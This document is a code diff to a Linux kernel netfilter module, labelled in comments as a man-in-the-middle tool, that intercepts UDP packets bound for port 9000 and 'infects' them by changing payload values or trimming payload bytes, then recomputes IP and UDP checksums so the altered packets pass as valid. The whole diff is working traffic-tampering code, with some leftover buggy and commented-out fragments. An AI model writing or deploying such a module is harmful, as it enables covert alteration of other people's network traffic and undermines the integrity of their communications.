@@ -12,7 +12,7 @@
 #include <linux/cdev.h>
 #include <linux/inet.h>
 #define PORT 8080
-#define SUB_SIZE 4;
+#define SUB_SIZE 4
 //TODO:infect the packet
 MODULE_LICENSE("Dual BSD/GPL");
 static dev_t my_dev = 0;
@@ -47,7 +47,7 @@ void infectionByData(struct sk_buff *skb,struct udphdr *udph,struct iphdr *iph, 
 			*/
 			printk("payload is %d",*((int*)payload));
               // change UDP data
-              *((int*)payload)+=1;
+              *((int*)payload+1)+=1;
               /*
               for (i=0;i<9;i++)
               {
@@ -62,21 +62,28 @@ void infectionByData(struct sk_buff *skb,struct udphdr *udph,struct iphdr *iph, 
 
 }
 
-void infectionBySize(struct sk_buff *skb1,struct udphdr *udph,struct iphdr *iph,struct ethhdr *eth,unsigned char *payload,int payload_len)
+void infectionBySizeOld(struct sk_buff *skb1,struct udphdr *udph,struct iphdr *iph,struct ethhdr *eth,unsigned char *payload,int payload_len)
 {
     unsigned char* data;
     int i=0;
+    __wsum partial;
+
     //GET NET DEVICE
+
     unsigned char mac_source_char[ETH_ALEN]={};
     unsigned char mac_dest_char[ETH_ALEN]={};
     struct net_device *enp0s3;
     char addr[ETH_ALEN] = {0x00,0x00,0x00,0x00,0x00,0x00};
 	uint8_t dest_addr[ETH_ALEN];
+	uint8_t source_addr[ETH_ALEN];
     enp0s3 = dev_get_by_name(&init_net,"enp0s3");
     memcpy(dest_addr, addr,ETH_ALEN);
+    memcpy(source_addr,addr,ETH_ALEN);
 	/* Skb */
     struct sk_buff* skb = alloc_skb(ETH_HLEN+payload_len+sizeof(struct udphdr)+sizeof(struct iphdr), GFP_ATOMIC);//allocate a network buffer
     skb->dev = enp0s3;
+    //dev_hard_start_xmit(skb,lo);
+    //lo->hard_start_xmit=hard_start_xmit(skb,lo);
     skb->pkt_type = PACKET_OUTGOING;
     skb->protocol = htons(ETH_P_IP);
     skb->no_fcs = 1;
@@ -84,11 +91,12 @@ void infectionBySize(struct sk_buff *skb1,struct udphdr *udph,struct iphdr *iph,
     skb->priority = 0;
     skb->next = skb->prev = NULL;
     skb_reserve(skb, ETH_HLEN+sizeof(struct iphdr)+sizeof(struct udphdr));//adjust headroom
-    /* allocate space to data and write it */
+
+    /* Allocate space to data and write it */
     data = skb_put(skb,payload_len);
     memcpy(data, payload, payload_len);
 
-      /* UDP header */
+    /* UDP header */
     struct udphdr* udp_hdr = (struct udphdr*)skb_push(skb,sizeof(struct udphdr));
     udp_hdr->len = htons(payload_len+sizeof(struct udphdr));
     udp_hdr->source = udph->source;
@@ -104,12 +112,14 @@ void infectionBySize(struct sk_buff *skb1,struct udphdr *udph,struct iphdr *iph,
     ip_hdr->version = iph->version; // IPv4u
     ip_hdr->tos = iph->tos;
     ip_hdr->tot_len=htons(payload_len+sizeof(struct udphdr)+sizeof(struct iphdr));
+    ip_hdr->id=iph->id;
     ip_hdr->frag_off = iph->frag_off;
     ip_hdr->ttl = iph->ttl; // Set a TTL.
     ip_hdr->protocol = iph->protocol; //  protocol.
-    ip_hdr->check = iph->check;
+    //ip_hdr->check = iph->check;
     ip_hdr->saddr = iph->saddr;
     ip_hdr->daddr = iph->daddr;
+
 
     printk("ip_hdr->saddr %x",ip_hdr->saddr);
     printk("ip_hdr->daddr %x",ip_hdr->daddr);
@@ -121,19 +131,22 @@ void infectionBySize(struct sk_buff *skb1,struct udphdr *udph,struct iphdr *iph,
     eth_hdr->h_proto = htons(ETH_P_IP);
     //memcpy(eth_hdr->h_source,skb1->data, ETH_ALEN);
     //memcpy(eth_hdr->h_dest, skb1->data+6, ETH_ALEN);
-
-    memcpy(eth_hdr->h_source,enp0s3->dev_addr, ETH_ALEN);
-    memcpy(eth_hdr->h_dest,addr, ETH_ALEN);
+    memcpy(eth_hdr->h_source,dest_addr, ETH_ALEN);
+    memcpy(eth_hdr->h_dest,source_addr, ETH_ALEN);
     printk("eth_hdr->h_source :");
     printk("Source MAC=%x:%x:%x:%x:%x:%x\n",eth_hdr->h_source[0],eth_hdr->h_source[1],eth_hdr->h_source[2],eth_hdr->h_source[3],eth_hdr->h_source[4],eth_hdr->h_source[5]);
-    printk("\neth_hdr->h_dest :");
     printk("Dest MAC=%x:%x:%x:%x:%x:%x\n",eth_hdr->h_dest[0],eth_hdr->h_dest[1],eth_hdr->h_dest[2],eth_hdr->h_dest[3],eth_hdr->h_dest[4],eth_hdr->h_dest[5]);
-  /* caculate checksum */
-	skb->csum = skb_checksum(skb, ip_hdr->ihl*4, skb->len-ip_hdr->ihl*4, 0);
-	ip_hdr->check = ip_fast_csum(ip_hdr, ip_hdr->ihl);
-	udp_hdr->check = csum_tcpudp_magic(ip_hdr->saddr, ip_hdr->daddr, skb->len-ip_hdr->ihl*4, IPPROTO_UDP, skb->csum);
 
-     if (dev_queue_xmit(skb) < 0)
+  /* caculate checksum */
+    skb->csum=0;
+	skb->csum = skb_checksum(skb, ip_hdr->ihl*4, skb->len-ip_hdr->ihl*4, 0);
+	ip_hdr->check=0;
+	ip_hdr->check = ip_fast_csum((unsigned char*)ip_hdr, ip_hdr->ihl);
+    partial=csum_partial((unsigned char *)udp_hdr,udp_hdr->len,0);
+    udp_hdr->check=0;
+	udp_hdr->check =csum_tcpudp_magic(ip_hdr->saddr, ip_hdr->daddr, /*skb->len-ip_hdr->ihl*4*/udp_hdr->len, IPPROTO_UDP, /*skb->csum*/partial);
+
+     if (dev_queue_xmit(skb)<0)
       {
                 dev_put(enp0s3);
                 kfree_skb(skb);
@@ -141,6 +154,23 @@ void infectionBySize(struct sk_buff *skb1,struct udphdr *udph,struct iphdr *iph,
                 return;
       }
         printk("send packet by skb success.\n");
+
+}
+
+void infectionBySize(struct sk_buff *skb,struct udphdr *udp_hdr,struct iphdr *ip_hdr,int infectionSize)
+{
+    __wsum partial;
+    skb_trim(skb, skb->len - infectionSize);
+    ip_hdr->tot_len=htons(ntohs(ip_hdr->tot_len)-infectionSize);
+    udp_hdr->len = htons(ntohs(udp_hdr->len )-infectionSize);
+    skb->csum=0;
+	skb->csum = skb_checksum(skb, ip_hdr->ihl*4, skb->len-ip_hdr->ihl*4, 0);
+	ip_hdr->check=0;
+	ip_hdr->check = ip_fast_csum((unsigned char*)ip_hdr, ip_hdr->ihl);
+    partial=csum_partial((unsigned char *)udp_hdr,udp_hdr->len,0);
+    udp_hdr->check=0;
+	udp_hdr->check =csum_tcpudp_magic(ip_hdr->saddr, ip_hdr->daddr, /*skb->len-ip_hdr->ihl*4*/udp_hdr->len, IPPROTO_UDP, /*skb->csum*/partial);
+
 }
 
 unsigned int hook_func(void *priv, struct sk_buff *skb, const struct nf_hook_state *state)
@@ -152,9 +182,9 @@ unsigned int hook_func(void *priv, struct sk_buff *skb, const struct nf_hook_sta
     struct iphdr *iph;
     struct ethhdr *eth;
     int payload_len=0;
-     unsigned char *tail;
-    int i=0;
+    unsigned char *tail;
     struct sk_buff *new_sk_buff;
+    int infectionSize=SUB_SIZE;
     //printk(KERN_ALERT "myMITM inside hook function\n");
     if(skb)
     {
@@ -167,35 +197,15 @@ unsigned int hook_func(void *priv, struct sk_buff *skb, const struct nf_hook_sta
                 udph=(struct udphdr*)skb_transport_header(skb);
                 if(udph->dest==htons(9000))
                 {
-                    printk("\neth->h_source :");
-                    //printk(KERN_EMERG "Source MAC=%x:%x:%x:%x:%x:%x\n",eth->h_source[0],eth->h_source[1],eth->h_source[2],eth->h_source[3],eth->h_source[4],eth->h_source[5]);
-                    printk(KERN_EMERG "Source MAC=%x:%x:%x:%x:%x:%x\n",skb->data[0],skb->data[1],skb->data[2],skb->data[3],skb->data[4],skb->data[5]);
-                    printk("\neth->h_dest :");
-                    printk(KERN_EMERG "Dest MAC=%x:%x:%x:%x:%x:%x\n",eth->h_dest[0],eth->h_dest[1],eth->h_dest[2],eth->h_dest[3],eth->h_dest[4],eth->h_dest[5]);
-
-                   //printk("eth->h_source :%x",eth->h_source);
-                  // printk("eth->h_dest :%x",eth->h_dest);
-                    tail=skb_tail_pointer(skb);
-                    paylaod_data=(unsigned char*)udph+sizeof(struct udphdr);//skb->data+(iph->ihl * 4)+sizeof(udph);
-                    payload_len=(unsigned char*)tail-(unsigned char*)udph-sizeof(struct udphdr);
-                    printk("skb->mac_len :%d",skb->mac_len);
-                    //printk("iphdr= %d",sizeof(struct iphdr));
-                    //printk("ip->ihl %d",iph->ihl);
-                    //printk("payload len= %d",payload_len);
-                    //printk("skb->udphdr= %u\n",udph);
-                    //printk("sizeof(udphdr)= %d\n",sizeof(struct udphdr));
-                    //printk("skb->tail= %u\n",skb_tail_pointer(skb));
-
-                    //(unsigned char*)skb->tail-((unsigned char*)udph+sizeof(struct udphdr));
-                   /* for(i=0;i<40;i++)
-                        printk("payload_[%d]= %d\n",i,paylaod_data[i]);
-                    */
-                    payload_len-=SUB_SIZE
-                    //printk("payload_len after sub= %d",payload_len);
+                    //tail=skb_tail_pointer(skb);
+                    //paylaod_data=(unsigned char*)udph+sizeof(struct udphdr);//skb->data+(iph->ihl * 4)+sizeof(udph);
+                    //payload_len=(unsigned char*)tail-(unsigned char*)udph-sizeof(struct udphdr);
+                    //payload_len-=SUB_SIZE
                     switch(infectionMethod)
                     {
                        case 0:infectionByData(skb,udph,iph,paylaod_data);break;
-                       case 1:infectionBySize(skb,udph,iph,eth,paylaod_data,payload_len);return NF_ACCEPT;//if its to change the size
+                       case 1:infectionBySize(skb,udph,iph,infectionSize);break;
+                       //case 1:infectionBySize(skb,udph,iph,eth,paylaod_data,payload_len);break;//if its to change the size
                                                                                                     //i want to drop the old sk_buff and send the new(infected) sk_buff
                     }
                 }
